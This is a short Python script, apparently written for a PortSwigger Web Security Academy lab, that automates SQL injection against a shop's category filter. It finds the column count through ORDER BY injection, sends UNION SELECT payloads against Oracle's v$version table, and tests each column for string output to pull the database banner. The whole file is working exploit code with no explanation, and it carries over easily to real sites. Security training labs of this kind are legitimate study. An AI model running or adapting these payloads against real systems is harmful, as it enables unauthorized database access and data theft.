#SQL injection attack, querying the database type and version on Oracle,Microsoft MySQL etc


import requests

url = "https://0af800be04f3d55dc03013d1009c00d7.web-security-academy.net/filter?category=Gifts"

#Retrieve column
def retrieve_column(url):
    for i in range(1,100):
        query = "'Order+by+"+str(i)+"--"
        #print(url+query)
        r = requests.get(url+query)
        #print(r)
        if r.status_code != 200:
            break
    return (i-1)

total_columns=retrieve_column(url)
#print(total_columns)

def passing_null_values(url):
    null_value = ("")
    for i in range(total_columns):
        null_value = "NULL,"+null_value
    null_value = null_value[0:-1]
    query="'union+select+"+null_value+"from v$version+--" #v$version valid for Oracle DB
    print(url+query)
    r = requests.get(url+query)
    print(r.status_code)
    #print(r.text)
    return null_value
null_value_passing=passing_null_values(url)
null_value_passing_list = list(null_value_passing.split(','))



def replacing_strings(stringName,source,destination,j):
    stringName[j] = destination
    return stringName

def list_to_string(stringName):
    return(" ,".join([str(elem) for elem in stringName]))


def passing_strings(url,null_value_passing_list):
    #Passing any string
    src = "NULL"
    for i in range(0,len(null_value_passing_list)):
        output_value = replacing_strings(null_value_passing_list,src,"Banner", i)
        output_string = list_to_string(output_value)
        query = "'UNION SELECT "+output_string+" from v$version+ -- "
        #print(url+query)
        r = requests.get(url+query)
        #print(r)
        #print(r.text)
        null_value_passing_list[i] = src
        if r.status_code == 200:
            print("\nValid for:{}".format(url+query))
        else:
            print("\nInvalid for:{}".format(url+query))

passing_strings(url, null_value_passing_list)

